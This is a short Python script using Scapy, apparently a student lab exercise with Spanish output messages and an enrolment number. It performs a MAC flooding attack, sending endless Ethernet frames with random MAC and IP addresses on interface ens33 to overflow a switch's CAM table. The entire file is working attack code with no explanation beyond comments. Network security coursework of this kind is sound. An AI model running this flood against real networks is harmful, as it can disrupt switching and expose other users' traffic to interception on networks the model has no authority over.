#!/usr/bin/env python3

import sys
from scapy.all import *

print("==========================================================")
print("  EJECUTANDO: MAC FLOODING (Matrícula: 2024-2415)")
print("==========================================================")
print("[*] Inundando la tabla CAM... Presiona Ctrl+C para detener.")

try:
    # Genera tramas con MACs e IPs aleatorias infinitamente
    pkt = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP()) / ICMP()
    sendp(pkt, iface="ens33", loop=1, verbose=False)
except KeyboardInterrupt:
    print("\n[+] Ataque detenido.")
    sys.exit(0)
